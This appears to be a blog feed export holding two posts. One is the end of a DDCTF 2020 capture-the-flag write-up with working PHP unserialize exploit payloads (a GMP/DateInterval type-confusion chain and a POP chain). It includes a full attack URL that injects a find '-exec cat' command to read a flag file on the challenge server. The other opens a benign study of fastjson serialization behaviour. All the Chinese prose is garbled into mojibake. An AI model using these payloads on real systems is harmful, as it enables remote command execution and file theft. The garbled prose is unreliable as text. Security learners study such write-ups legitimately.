<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907144813693.png" alt="image-20200907144813693"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good Job! You&#39;ve got the preffix of the flag: DDCTF&#123;VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‚è€ƒé‚£ç¯‡æ–‡ç« å’Œhackoneçš„payloadã€‚</p>
<p>æ¼æ´åˆ©ç”¨éœ€è¦æœ‰__wakeup()å‡½æ•°ï¼Œé¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªMyClassåŒ…å«ä¸€ä¸ª__wakeup()å‡½æ•°ï¼Œä½†æ˜¯å…¶å¯¹åº”çš„kw0ngå˜é‡å€¼ä¸º1ï¼Œåªèƒ½é€šè¿‡ååºåˆ—åŒ–ä¿®æ”¹$show(ç¬¬ä¸€ä¸ªå®ä¾‹åŒ–çš„Displayç±»)çš„æˆå‘˜ã€‚æ‰€ä»¥éœ€è¦åˆ©ç”¨DateIntervalå†…ç½®ç±»çš„__wakeup()å‡½æ•°ï¼Œæœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inner = <span class="string">'s:1:"1";a:3:&#123;s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:&#123;s:4:"ryat";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"1";a:2:&#123;s:8:"contents";s:8:"hiasfgas";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"1";a:2:&#123;s:8:"contents";s:8:"hiasfgas";i:0;O:7:"MyClass":1:&#123;s:5:"kw0ng";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"3";a:3:&#123;s:5:"kw0ng";R:1;s:4:"flag";s:43:"-exec cat /HackersForever/suffix_flag.php ;";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line"><span class="comment">//-exec cat /FlagNeverFall/suffix_flag.php &#123;&#125; ;</span></span><br><span class="line">$exploit = <span class="string">'a:1:&#123;i:0;C:3:"GMP":'</span>.strlen($inner).<span class="string">':&#123;'</span>.$inner.<span class="string">'&#125;&#125;'</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>MyClassçš„<em>\</em>wakeup()</li>
</ul>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907202246240.png" alt="image-20200907202246240"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯$showçš„contentsè¢«ä¿®æ”¹äº†ã€‚</p>
<ul>
<li>DateIntervalçš„__wakeup()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$bullet &#x3D; &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:84:&#123;s:1:&quot;1&quot;;a:2:&#123;s:8:&quot;contents&quot;;s:8:&quot;hiasfgas&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907202817990.png" alt="image-20200907202817990" style="zoom:150%;">

<p>å°†så¯¹åº”çš„å€¼æ›´æ”¹ä¸º3ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$bullet &#x3D; &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:84:&#123;s:1:&quot;3&quot;;a:2:&#123;s:8:&quot;contents&quot;;s:8:&quot;hiasfgas&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907203049206.png" alt="image-20200907203049206" style="zoom:150%;">

<p>è¿™æ ·å°±æŠŠ$mcçš„contentså€¼ä¿®æ”¹äº†ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™é‡Œä¿®æ”¹$mcçš„flagå€¼ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.137.166&#x2F;EOf9uk3nSsVFK1LQ.php?bullet&#x3D;a:1:&#123;i:0;C:3:&quot;GMP&quot;:132:&#123;s:1:&quot;3&quot;;a:3:&#123;s:5:&quot;kw0ng&quot;;R:1;s:4:&quot;flag&quot;;s:43:&quot;-exec cat &#x2F;HackersForever&#x2F;suffix_flag.php ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172112628.png" alt="image-20200907172112628"></p>
<p>å¦å¤–è¿˜å¯ä»¥ä¸åˆ©ç”¨GMPçš„æ¼æ´ï¼Œç›´æ¥ç”¨ååºåˆ—åŒ–ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///FlagNeverFall/suffix_flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$my = <span class="keyword">new</span> MyClass();</span><br><span class="line">$my-&gt;flag = <span class="string">'-exec cat /FlagNeverFall/suffix_flag.php &#123;&#125; ;'</span>;</span><br><span class="line"></span><br><span class="line">$rep = <span class="keyword">new</span> Repeater();</span><br><span class="line">$rep-&gt;content = [$my,<span class="string">'get_flag'</span>];</span><br><span class="line">$dis = <span class="keyword">new</span> Display();</span><br><span class="line">$dis-&gt;page = $rep;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($dis));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?bullet&#x3D;O%3A7%3A%22Display%22%3A2%3A%7Bs%3A8%3A%22contents%22%3BN%3Bs%3A4%3A%22page%22%3BO%3A8%3A%22Repeater%22%3A2%3A%7Bs%3A7%3A%22content%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A7%3A%22MyClass%22%3A2%3A%7Bs%3A5%3A%22kw0ng%22%3BN%3Bs%3A4%3A%22flag%22%3Bs%3A45%3A%22-exec+cat+%2FFlagNeverFall%2Fsuffix_flag.php+%7B%7D+%3B%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7Ds%3A14%3A%22%00Repeater%00cont%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907162515459.png" alt="image-20200907162515459"></p>
<p>æ„Ÿè§‰è¿™ä¸ªååºåˆ—åŒ–æ˜¯ç”¨æ¥åŒ…å«hint.phpçš„ã€‚</p>
<p>å‚è€ƒ</p>
<p><a href="https://www.anquanke.com/post/id/216694" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216694</a></p>
<p><a href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/" target="_blank" rel="noopener">https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢fastjsonç³»åˆ—æ¼æ´</title>
    <url>/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>å‚è€ƒå‡ ä½å¸ˆå‚…çš„æ–‡ç« å¤ç°åˆ†æä¸‹fastjsonçš„æ¼æ´</p>
<a id="more"></a>

<h1 id="0x01-åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#0x01-åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="0x01 åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>0x01 åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h1><p>ä¸ºäº†æ–¹ä¾¿ä¿®æ”¹fastjsonç‰ˆæœ¬ï¼Œåˆ©ç”¨mavenæ„å»ºé¡¹ç›®ï¼Œ</p>
<p>ç›´æ¥ç”¨äº†<a href="http://www.rai4over.cn/" target="_blank" rel="noopener">rai4over</a>å¸ˆå‚…çš„æºç ï¼ŒUser()çš„æˆå‘˜åŠå…¶å±æ€§å¦‚ä¸‹ï¼š</p>
<img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907111204669.png" alt="image-20200907111204669" style="zoom:150%;">

<h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><ul>
<li><strong>éè‡ªçœçš„åºåˆ—åŒ–</strong>ï¼š<code>JSON.toJSONString(Object object)</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User a = <span class="keyword">new</span> User();</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        String jsonstr_a = JSON.toJSONString(a);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907112008933.png" alt="image-20200907112008933"></p>
<p>åªè¦å­˜åœ¨getæ–¹æ³•ï¼ˆä¸ç®¡æ˜¯publicè¿˜æ˜¯privateï¼‰éƒ½è¢«è°ƒç”¨ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span>,</span><br><span class="line">	<span class="attr">"age2"</span>: <span class="string">"a2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°é™¤äº†<strong>privateå±æ€§è€Œä¸”ä¸å­˜åœ¨å¯¹åº”çš„getæ–¹æ³•çš„æˆå‘˜</strong>å¤–ï¼Œå…¶ä»–çš„æˆå‘˜å‡è¢«åºåˆ—åŒ–ã€‚</p>
<ul>
<li><strong>è‡ªçœçš„åºåˆ—åŒ–</strong>ï¼š<code>toJSONString(Object object, SerializerFeature... features)</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User a = <span class="keyword">new</span> User();</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        String jsonstr_a = JSON.toJSONString(a,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907112634394.png" alt="image-20200907112634394"></p>
<p>åªè¦å­˜åœ¨getæ–¹æ³•ï¼ˆä¸ç®¡æ˜¯publicè¿˜æ˜¯privateï¼‰éƒ½è¢«è°ƒç”¨ã€‚ä¸éè‡ªçœç›¸åŒã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>: <span class="string">"User"</span>,</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span>,</span><br><span class="line">	<span class="attr">"age2"</span>: <span class="string">"a2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸éè‡ªçœçš„åŒºåˆ«æ˜¯å¢åŠ äº†<code>@type</code>å­—æ®µï¼Œå¯ä»¥å¾—åˆ°å¯¹è±¡çš„ç±»å‹ã€‚</p>
<h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><ul>
<li><strong>ååºåˆ—åŒ–åˆ†ä¸‰ç§</strong>ï¼Œåˆ†åˆ«æ˜¯<code>parseObject(String text, Class&lt;T&gt; clazz)</code>ã€<code>JSONObject parseObject(String text)</code>ã€<code>parse(String text)</code>ã€‚ååºåˆ—åŒ–æ—¶è¦æŠŠUser.javaä¸­çš„æ„é€ å‡½æ•°æ³¨é‡Šæ‰ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstr_a = <span class="string">"&#123;\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        String jsonstr_b = <span class="string">"&#123;\"@type\":\"User\",\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"@type\":\"java.util.Properties\",\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"@type\":\"java.util.Properties\",\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"@type\":\"java.util.Properties\",\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"@type\":\"java.util.Properties\",\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"@type\":\"java.util.Properties\",\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"@type\":\"java.util.Properties\",\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"@type\":\"java.util.Properties\",\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"@type\":\"java.util.Properties\",\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        System.out.println(<span class="string">"============JSON.parseObject()æŒ‡å®šç±»ï¼Œéè‡ªçœ==============="</span>);</span><br><span class="line">        User a = JSON.parseObject(jsonstr_a, User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(a);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"============JSON.parseObject()è‡ªçœ==============="</span>);</span><br><span class="line">        JSONObject b = JSON.parseObject(jsonstr_b);</span><br><span class="line">        System.out.println(b);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"============JSON.parse()==============="</span>);</span><br><span class="line">        Object c = JSON.parse(jsonstr_b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907122925167.png" alt="image-20200907122925167"></p>
<ul>
<li><p><strong>JSON.parseObject()æŒ‡å®šç±»ï¼Œéè‡ªçœ</strong></p>
<p>åªè¦å­˜åœ¨setæ–¹æ³•ï¼ˆä¸ç®¡æ˜¯publicè¿˜æ˜¯privateï¼‰éƒ½è¢«è°ƒç”¨ã€‚é¢å¤–è°ƒç”¨äº†<code>getprop2_2();//privateä¸”æœ‰get</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'null', age3 = 'a3', age4 = 'null', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>publicå±æ€§æˆ–å«æœ‰setæ–¹æ³•çš„æˆå‘˜éƒ½è¢«èµ‹å€¼ï¼Œprivateå±æ€§è€Œä¸”æ²¡æœ‰setæ–¹æ³•çš„çš„æˆå‘˜èµ‹å€¼ä¸ºnull,ä½†æ˜¯è¿™é‡Œprop2_2è¢«èµ‹å€¼äº†ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚</p>
</li>
<li><p><strong>JSON.parseObject()è‡ªçœ</strong></p>
<p>æ‰€æœ‰çš„setå’Œgetæ–¹æ³•éƒ½è¢«è°ƒç”¨ï¼ŒgetProp2_2è°ƒç”¨äº†ä¸¤æ¬¡ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œpublicå±æ€§çš„æˆå‘˜éƒ½è¢«èµ‹å€¼ï¼Œprivateå±æ€§çš„çš„åªæœ‰age1å’Œprop2_1è¢«èµ‹å€¼ã€‚</p>
</li>
<li><p><strong>JSON.parse()</strong></p>
<p>åªè¦å­˜åœ¨setæ–¹æ³•ï¼ˆä¸ç®¡æ˜¯publicè¿˜æ˜¯privateï¼‰éƒ½è¢«è°ƒç”¨ã€‚é¢å¤–è°ƒç”¨äº†<code>getprop2_2();//privateä¸”æœ‰get</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'null', age3 = 'a3', age4 = 'null', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>publicå±æ€§æˆ–å«æœ‰setæ–¹æ³•çš„æˆå‘˜éƒ½è¢«èµ‹å€¼ï¼Œprivateå±æ€§è€Œä¸”æ²¡æœ‰setæ–¹æ³•çš„çš„æˆå‘˜èµ‹å€¼ä¸ºnull,ä½†æ˜¯è¿™é‡Œprop2_2è¢«èµ‹å€¼äº†ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚</p>
</li>
</ul>
<p><strong>ps:</strong>å¯ä»¥é€šè¿‡ä¼ é€’<code>Feature.SupportNonPublicField</code>æ¥å¯¹æ²¡æœ‰setæ–¹æ³•çš„privateå±æ€§æˆå‘˜èµ‹å€¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstr_a = <span class="string">"&#123;\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        User b = JSON.parseObject(jsonstr_a, User<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907125946234.png" alt="image-20200907125946234"></p>
